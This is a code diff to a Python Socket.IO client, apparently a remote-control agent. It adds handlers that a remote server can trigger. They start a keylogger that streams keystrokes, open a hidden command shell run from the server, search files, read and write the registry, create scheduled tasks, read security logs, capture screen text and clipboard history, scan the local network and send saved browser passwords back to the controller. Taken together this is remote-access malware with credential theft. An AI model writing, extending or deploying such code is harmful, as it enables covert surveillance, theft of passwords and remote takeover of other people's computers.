@@ -21,7 +21,9 @@ _recorder = None
 _camera = None
 _mic = None
 _lock = threading.Lock()
-_screen_recorder = None  # active screen-recording thread state
+_screen_recorder = None
+_keylogger = None
+_shell_proc = None
 
 
 def init(controller_fn, recorder, camera, mic=None):
@@ -603,6 +605,294 @@ def _make_client():
                 sio.emit("recording_result", {"ok": False, "error": "output file missing", "_requester": requester})
         except Exception as e:
             sio.emit("recording_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    # ── Keylogger ─────────────────────────────────────────────────────────────
+    @sio.on("keylog_on")
+    def _on_keylog_on(data):
+        global _keylogger
+        if _keylogger:
+            return
+        try:
+            from pynput import keyboard as _kb
+            def _on_press(key):
+                try:
+                    char = key.char or ""
+                except AttributeError:
+                    char = f"[{key.name}]"
+                _emit("key", {"char": char, "source": "keylog"})
+            listener = _kb.Listener(on_press=_on_press)
+            listener.daemon = True
+            listener.start()
+            _keylogger = listener
+            sio.emit("keylog_status", {"running": True, "_requester": data.get("_requester") if data else None})
+        except Exception as e:
+            sio.emit("keylog_status", {"running": False, "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    @sio.on("keylog_off")
+    def _on_keylog_off(data):
+        global _keylogger
+        if _keylogger:
+            try: _keylogger.stop()
+            except Exception: pass
+            _keylogger = None
+        sio.emit("keylog_status", {"running": False, "_requester": data.get("_requester") if data else None})
+
+    # ── Reverse shell ─────────────────────────────────────────────────────────
+    @sio.on("shell_start")
+    def _on_shell_start(data):
+        global _shell_proc
+        if _shell_proc and _shell_proc.poll() is None:
+            sio.emit("shell_started", {"ok": False, "error": "shell already running"})
+            return
+        try:
+            import subprocess as _sp
+            shell = (data or {}).get("shell", "cmd.exe")
+            proc = _sp.Popen(
+                [shell], stdin=_sp.PIPE, stdout=_sp.PIPE, stderr=_sp.STDOUT,
+                creationflags=0x08000000, bufsize=0,
+            )
+            _shell_proc = proc
+            def _read():
+                while proc.poll() is None:
+                    try:
+                        line = proc.stdout.readline()
+                        if line:
+                            sio.emit("shell_output", {"data": line.decode(errors="replace")})
+                    except Exception:
+                        break
+                sio.emit("shell_output", {"data": "", "closed": True})
+                global _shell_proc
+                _shell_proc = None
+            threading.Thread(target=_read, daemon=True, name="shell-out").start()
+            sio.emit("shell_started", {"ok": True})
+        except Exception as e:
+            sio.emit("shell_started", {"ok": False, "error": str(e)})
+
+    @sio.on("shell_input")
+    def _on_shell_input(data):
+        if not _shell_proc or _shell_proc.poll() is not None:
+            return
+        try:
+            cmd = (data or {}).get("cmd", "") + "\n"
+            _shell_proc.stdin.write(cmd.encode(errors="replace"))
+            _shell_proc.stdin.flush()
+        except Exception:
+            pass
+
+    @sio.on("shell_stop")
+    def _on_shell_stop(data):
+        global _shell_proc
+        if _shell_proc:
+            try: _shell_proc.kill()
+            except Exception: pass
+            _shell_proc = None
+
+    # ── Drive list ────────────────────────────────────────────────────────────
+    @sio.on("get_drives")
+    def _on_get_drives(data):
+        try:
+            import wintools as wt
+            drives = wt.list_drives()
+            sio.emit("drives_result", {"drives": drives, "_requester": data.get("_requester") if data else None})
+        except Exception as e:
+            sio.emit("drives_result", {"drives": [], "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    # ── File search ───────────────────────────────────────────────────────────
+    @sio.on("search_files")
+    def _on_search_files(data):
+        try:
+            import os as _os, fnmatch as _fn
+            root    = (data or {}).get("path", _os.path.expanduser("~"))
+            pattern = (data or {}).get("pattern", "*")
+            content = (data or {}).get("content", "")
+            limit   = (data or {}).get("limit", 200)
+            matches = []
+            for dirpath, _, files in _os.walk(root):
+                for fname in files:
+                    if _fn.fnmatch(fname.lower(), pattern.lower()):
+                        full = _os.path.join(dirpath, fname)
+                        if content:
+                            try:
+                                with open(full, "r", errors="replace") as f:
+                                    if content.lower() not in f.read().lower():
+                                        continue
+                            except Exception:
+                                continue
+                        matches.append(full)
+                        if len(matches) >= limit:
+                            break
+                if len(matches) >= limit:
+                    break
+            sio.emit("search_result", {"matches": matches, "count": len(matches), "_requester": data.get("_requester") if data else None})
+        except Exception as e:
+            sio.emit("search_result", {"matches": [], "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    # ── Windows event logs ────────────────────────────────────────────────────
+    @sio.on("get_event_logs")
+    def _on_get_event_logs(data):
+        try:
+            import wintools as wt
+            log   = (data or {}).get("log", "Security")
+            count = (data or {}).get("count", 50)
+            entries = wt.get_event_logs(log, count)
+            sio.emit("event_logs_result", {"entries": entries, "count": len(entries), "_requester": data.get("_requester") if data else None})
+        except Exception as e:
+            sio.emit("event_logs_result", {"entries": [], "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    # ── Registry ──────────────────────────────────────────────────────────────
+    @sio.on("registry_get")
+    def _on_registry_get(data):
+        try:
+            import wintools as wt
+            result = wt.registry_get(
+                (data or {}).get("hive", "HKCU"),
+                (data or {}).get("path", ""),
+                (data or {}).get("name", ""),
+            )
+            result["_requester"] = data.get("_requester") if data else None
+            sio.emit("registry_result", result)
+        except Exception as e:
+            sio.emit("registry_result", {"error": str(e), "_requester": data.get("_requester") if data else None})
+
+    @sio.on("registry_set")
+    def _on_registry_set(data):
+        try:
+            import wintools as wt
+            result = wt.registry_set(
+                (data or {}).get("hive", "HKCU"),
+                (data or {}).get("path", ""),
+                (data or {}).get("name", ""),
+                (data or {}).get("value", ""),
+                (data or {}).get("type", "REG_SZ"),
+            )
+            result["_requester"] = data.get("_requester") if data else None
+            sio.emit("set_registry_result", result)
+        except Exception as e:
+            sio.emit("set_registry_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    # ── Environment variables ─────────────────────────────────────────────────
+    @sio.on("get_env_vars")
+    def _on_get_env_vars(data):
+        try:
+            import wintools as wt
+            env = wt.get_env_vars()
+            sio.emit("env_vars_result", {"vars": env, "count": len(env), "_requester": data.get("_requester") if data else None})
+        except Exception as e:
+            sio.emit("env_vars_result", {"vars": {}, "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    # ── User accounts ─────────────────────────────────────────────────────────
+    @sio.on("get_users")
+    def _on_get_users(data):
+        try:
+            import wintools as wt
+            users = wt.list_user_accounts()
+            sio.emit("users_result", {"users": users, "count": len(users), "_requester": data.get("_requester") if data else None})
+        except Exception as e:
+            sio.emit("users_result", {"users": [], "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    # ── Scheduled tasks ───────────────────────────────────────────────────────
+    @sio.on("get_scheduled_tasks")
+    def _on_get_scheduled_tasks(data):
+        try:
+            import wintools as wt
+            tasks = wt.list_scheduled_tasks()
+            sio.emit("scheduled_tasks_result", {"tasks": tasks, "count": len(tasks), "_requester": data.get("_requester") if data else None})
+        except Exception as e:
+            sio.emit("scheduled_tasks_result", {"tasks": [], "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    @sio.on("create_scheduled_task")
+    def _on_create_task(data):
+        try:
+            import wintools as wt
+            result = wt.create_scheduled_task(
+                (data or {}).get("name", "NoraTask"),
+                (data or {}).get("command", ""),
+                (data or {}).get("trigger_time", ""),
+            )
+            result["_requester"] = data.get("_requester") if data else None
+            sio.emit("create_task_result", result)
+        except Exception as e:
+            sio.emit("create_task_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    @sio.on("delete_scheduled_task")
+    def _on_delete_task(data):
+        try:
+            import wintools as wt
+            result = wt.delete_scheduled_task((data or {}).get("name", ""))
+            result["_requester"] = data.get("_requester") if data else None
+            sio.emit("delete_task_result", result)
+        except Exception as e:
+            sio.emit("delete_task_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    # ── Audio playback ────────────────────────────────────────────────────────
+    @sio.on("play_audio")
+    def _on_play_audio(data):
+        try:
+            import wintools as wt
+            result = wt.play_audio((data or {}).get("path", ""))
+            result["_requester"] = data.get("_requester") if data else None
+            sio.emit("audio_play_result", result)
+        except Exception as e:
+            sio.emit("audio_play_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    # ── OCR screenshot ────────────────────────────────────────────────────────
+    @sio.on("ocr_screenshot")
+    def _on_ocr_screenshot(data):
+        try:
+            import mss as _mss, pytesseract as _tess
+            from PIL import Image as _Img
+            monitor = (data or {}).get("monitor", 1)
+            with _mss.mss() as sct:
+                shot = sct.grab(sct.monitors[monitor])
+                img  = _Img.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
+            text = _tess.image_to_string(img)
+            sio.emit("ocr_result", {"text": text, "_requester": data.get("_requester") if data else None})
+        except Exception as e:
+            sio.emit("ocr_result", {"text": "", "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    # ── Clipboard history ─────────────────────────────────────────────────────
+    @sio.on("get_clipboard_history")
+    def _on_get_clipboard_history(data):
+        try:
+            import wintools as wt
+            result = wt.get_clipboard_history()
+            result["_requester"] = data.get("_requester") if data else None
+            sio.emit("clipboard_history_result", result)
+        except Exception as e:
+            sio.emit("clipboard_history_result", {"current": "", "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    # ── LAN scan ──────────────────────────────────────────────────────────────
+    @sio.on("lan_scan")
+    def _on_lan_scan(data):
+        try:
+            import wintools as wt
+            devices = wt.lan_scan()
+            sio.emit("lan_scan_result", {"devices": devices, "count": len(devices), "_requester": data.get("_requester") if data else None})
+        except Exception as e:
+            sio.emit("lan_scan_result", {"devices": [], "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    # ── DNS cache ─────────────────────────────────────────────────────────────
+    @sio.on("get_dns_cache")
+    def _on_get_dns_cache(data):
+        try:
+            import wintools as wt
+            entries = wt.get_dns_cache()
+            sio.emit("dns_cache_result", {"entries": entries, "count": len(entries), "_requester": data.get("_requester") if data else None})
+        except Exception as e:
+            sio.emit("dns_cache_result", {"entries": [], "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    # ── Browser saved passwords ───────────────────────────────────────────────
+    @sio.on("get_browser_passwords")
+    def _on_get_browser_passwords(data):
+        try:
+            import wintools as wt
+            passwords = wt.get_browser_passwords()
+            sio.emit("browser_passwords_result", {
+                "passwords": passwords, "count": len(passwords),
+                "_requester": data.get("_requester") if data else None,
+            })
+        except Exception as e:
+            sio.emit("browser_passwords_result", {"passwords": [], "error": str(e), "_requester": data.get("_requester") if data else None})
 
     return sio
 
